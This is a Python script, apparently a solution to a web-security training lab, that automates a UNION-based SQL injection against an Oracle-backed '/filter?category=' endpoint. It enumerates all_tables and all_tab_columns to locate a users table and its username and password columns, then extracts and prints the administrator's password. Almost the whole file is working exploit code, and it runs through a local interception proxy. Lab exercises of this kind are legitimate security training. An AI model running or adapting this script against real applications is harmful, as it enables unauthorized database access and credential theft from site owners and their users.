import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_requests(url, sql_payload):
    path = '/filter?category=Lifestyle'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)   
    return r.text

def exploit_sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))  # Caret (^) matches "starts with..."
    return users_table

def exploit_sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'--" %users_table
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    usernames_column = soup.find(text=re.compile('.*USERNAME.*'))
    passwords_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return usernames_column, passwords_column

def exploit_sqli_admin_creds(url, users_table, usernames_column, passwords_column):
    sql_payload = "' UNION select %s, %s from %s--" % (usernames_column, passwords_column, users_table)
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(text='administrator').parent.findNext('td').contents[0]
    return admin_password

if __name__ == "__main__":

    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Looking for the users table...")
    users_table = exploit_sqli_users_table(url)
    if users_table:
        print("Found the users table: %s \n" % users_table)
        
        usernames_column, passwords_column = exploit_sqli_users_columns(url, users_table)
        if usernames_column and passwords_column:
            print("[+] Looking for the usernames and passwords columns on %s table..." %users_table)
            print("Found the usernames column: %s" % usernames_column)
            print("Found the passwords column: %s \n" % passwords_column)

            admin_password = exploit_sqli_admin_creds(url, users_table, usernames_column, passwords_column)
            if admin_password:
                print("[+] Determining the administrator password...")
                print("The administrator password is: %s" % admin_password)
            else:
                print("[-] Did not find the administrator password.")
        else:
            print("[-] Did not find the usernames and/or passwords columns!")
    else:
        print("[-] Could not determine the users table!\n")

